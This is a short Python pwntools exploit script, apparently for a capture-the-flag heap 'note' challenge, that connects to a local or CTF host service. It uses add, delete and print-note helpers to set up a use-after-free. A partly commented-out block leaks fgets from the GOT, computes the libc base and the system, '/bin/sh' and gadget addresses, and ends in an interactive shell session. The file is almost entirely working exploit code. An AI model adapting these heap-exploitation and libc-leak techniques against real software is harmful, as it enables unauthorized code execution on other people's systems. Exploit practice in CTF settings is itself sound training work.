from pwn import *
from time import sleep
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10137)
r = remote('localhost',8888)



def add_note(size,content):
    r.recvuntil(':')
    r.send('1')
    r.recvuntil(':')
    r.send(str(size))
    r.recvuntil(':')
    r.send(content)
def del_note(idx):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.sendline(str(idx))
def print_note(idx):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.sendline(str(idx))

size = 0xa0
content = 'faceb00c'
magic = 0x400c23

#first two
add_note(size,content)
add_note(size,content)
#
#free
'''
del_note(0)
del_note(1)
#lead got info
print_note_cotent_addr = 0x400886
fgets_got = 0x602050
fgets_off = 0x6dad0
add_note(0x10,p64(print_note_cotent_addr) + p64(fgets_got))
print_note(0)

libc = u64( r.recvline().strip().ljust(8,'\0') ) - fgets_off
print 'glibc : ' , hex(libc)
#reset got of fgets
sys_off = 0x45390
sys_addr = libc + sys_off
sh_off = 0x18cd17
sh_addr = libc+sh_off
gets_off = 0x6ed80
gets_addr = libc+gets_off
#
print 'sys_addr ',hex(sys_addr)
print 'sh_addr ',hex(sh_addr)
print 'gets_addr ',hex(gets_addr)
#
pop_rsp_off = 0x3838 #0x0000000000003838 : pop rsp ; ret
pop_rsp = libc + pop_rsp_off
buf = 0x400bd2

del_note(2)
add_note(0x10,flat([gets_addr,0xdeadbeef]) )
print_note(0)
r.sendline(flat( [buf,buf] ))
'''
#print_note(0)

r.interactive()